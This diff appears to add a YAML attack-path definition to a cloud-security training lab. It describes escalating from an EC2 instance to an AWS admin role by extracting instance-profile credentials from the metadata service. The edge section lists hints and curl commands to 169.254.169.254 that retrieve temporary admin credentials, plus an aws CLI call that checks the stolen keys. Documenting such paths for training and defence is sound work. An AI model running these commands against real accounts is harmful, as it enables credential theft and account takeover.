@@ -1,0 +1,51 @@
+attackMap:
+  nodes:
+    - id: ec2-instance
+      label: "EC2 Instance"
+      type: resource
+      subType: ec2-instance
+      arn: "arn:aws:ec2:{region}:{account_id}:instance/pl-cspm-ec2-001-instance"
+      description: >
+        You have gained access to this principal's AWS IAM credentials. These could
+        have been obtained through many real-world vectors: phishing a developer and
+        gaining access to their workstation, compromising a browser session, exploiting
+        a vulnerable workload running in this AWS account, discovering credentials in
+        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.
+
+        Regardless of how you obtained them, you are now operating as this principal.
+        This EC2 instance has an administrative IAM role attached via an instance profile.
+        Any process running on the instance can retrieve temporary admin credentials from
+        the Instance Metadata Service (IMDS) at 169.254.169.254 without authentication.
+
+    - id: admin-role
+      label: "Admin Role"
+      type: principal
+      subType: iam-role
+      isTarget: true
+      arn: "arn:aws:iam::{account_id}:role/pl-cspm-ec2-001-admin-role"
+      description: >
+        This IAM role has the AdministratorAccess AWS managed policy attached, granting
+        unrestricted access to all AWS services and resources. By extracting the temporary
+        credentials vended by the instance profile via IMDS, an attacker gains full
+        administrative control of the AWS account.
+
+  edges:
+    - from: ec2-instance
+      to: admin-role
+      label: "IMDS credential extraction"
+      description: >
+        Any process on the EC2 instance can retrieve temporary credentials for the
+        attached administrative role by querying the Instance Metadata Service. No
+        additional permissions or authentication are required.
+      hints:
+        - "EC2 instances can have IAM roles attached that grant AWS API access."
+        - "Check the instance metadata service for attached role credentials."
+        - "Query http://169.254.169.254/latest/meta-data/iam/security-credentials/ from within the instance."
+        - "Browse to https://pathfinding.cloud/paths/cspm-ec2-001 for technique details."
+      commands:
+        - description: "Retrieve the name of the attached IAM role from IMDS"
+          command: "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+        - description: "Extract temporary admin credentials from IMDS"
+          command: "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/pl-cspm-ec2-001-admin-role"
+        - description: "Verify administrative access using extracted credentials"
+          command: "AWS_ACCESS_KEY_ID=<AccessKeyId> AWS_SECRET_ACCESS_KEY=<SecretAccessKey> AWS_SESSION_TOKEN=<Token> aws iam list-users"
